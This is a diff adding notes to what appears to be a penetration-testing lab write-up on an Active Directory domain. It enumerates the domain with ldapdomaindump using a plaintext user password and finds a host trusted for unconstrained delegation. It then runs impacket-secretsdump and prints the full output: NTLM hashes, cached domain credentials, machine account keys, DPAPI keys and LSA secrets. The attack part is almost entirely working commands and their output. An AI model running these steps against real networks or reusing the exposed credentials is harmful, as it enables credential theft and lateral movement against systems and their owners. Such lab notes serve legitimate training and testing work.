@@ -53,3 +53,37 @@ VM01:
         name                          : SQL01
         dnshostname                   : SQL01.corp.com
 
+VM02: Again same target but we dont login into system
+
+    ldapdomaindump -u corp\\adam -p '4Toolsfigure3' -n 192.168.212.104 -r 192.168.212.100
+
+    grep TRUSTED_FOR_DELEGATION domain_computers.grep
+        FILES01 FILES01$        FILES01.corp.com        error.TIMEOUT   Windows Server 2022 Standard            10.0 (20348)    05/13/24 05:20:55       WORKSTATION_ACCOUNT, TRUSTED_FOR_DELEGATION     05/10/23 17:15:17       S-1-5-21-3515682028-2106700410-3524882512-1105
+
+    impacket-secretsdump adam@192.168.212.104
+        [*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+        Administrator:500:aad3b435b51404eeaad3b435b51404ee:96b927ecd4785badb8b50bc175c101c4:::
+        Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+        DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+        WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:94241c2263e6167bed713fd8a715aba2:::
+        [*] Dumping cached domain logon information (domain/username:hash)
+        CORP.COM/Administrator:$DCC2$10240#Administrator#841fd50c1b1692a3f7a122a8f083591b: (2023-09-21 08:15:44)
+        CORP.COM/adam:$DCC2$10240#adam#a00609bf99452ca88a5943a6c136a782: (2023-05-11 17:32:24)
+        [*] Dumping LSA Secrets
+        [*] $MACHINE.ACC 
+        CORP\FILES01$:aes256-cts-hmac-sha1-96:8cc2cc56bfa6d4a723f02a0e62cd515b8725ec23fb8a8674a27ee4f5bd122620
+        CORP\FILES01$:aes128-cts-hmac-sha1-96:93d1cfcf1dbdc7e0e0f0dad6b9c53e1e
+        CORP\FILES01$:des-cbc-md5:800889b3d9b5077a
+        CORP\FILES01$:plain_password_hex:fc30754de2dd094e9f0cc4e5c32f8097079ef8063f1a685ebe6cc54952b3346e2161d9b317e9a70c67ed264d85e0f9578c9a54b6c9d91af853fc857b95e3e9c3a7b67f22f0491adbd112f97e238b8275f55f4f3947a0609c9583bea0cd1299db205ca644990062a4f6389be64429380643ef26e4f85b552336fddda89f0330e8239e4d86283db30253cb6cb2b66564d19693a37d0b9cf6a8076463391855d53c350cbfc687079030c3005fd27a95b3e153de48addf107c28768881202ef6a179d93370c266bb4439bc411157ec1b87fd5e7a90ebd49d44a02cab4baadac0c79c113f71f26fd9f265a9c7f91ddf2c00e2
+        CORP\FILES01$:aad3b435b51404eeaad3b435b51404ee:254e5a4dd134ed6166614d31b7bcda75:::
+        [*] DPAPI_SYSTEM 
+        dpapi_machinekey:0xfb4cbb479c41c1fa9ed9b07c557a89cf272c9508
+        dpapi_userkey:0xa663d8bf874cbafea71d69913d5097f39e7e4b26
+        [*] NL$KM 
+         0000   03 DF 44 95 0A 0B 1D 85  F5 DC EC 27 0C 1B 84 95   ..D........'....
+         0010   56 77 9C 11 67 19 55 A4  57 FD F6 33 A4 48 D7 CA   Vw..g.U.W..3.H..
+         0020   E8 8B F8 8A 9A 77 F5 84  62 74 34 F9 1D 34 61 4C   .....w..bt4..4aL
+         0030   B7 AE 10 55 25 50 4C 49  58 B1 1C 57 BA B6 DF 14   ...U%PLIX..W....
+        NL$KM:03df44950a0b1d85f5dcec270c1b849556779c11671955a457fdf633a448d7cae88bf88a9a77f584627434f91d34614cb7ae105525504c4958b11c57bab6df14
+
+https://www.thehacker.recipes/ad/movement/kerberos/delegations/unconstrained
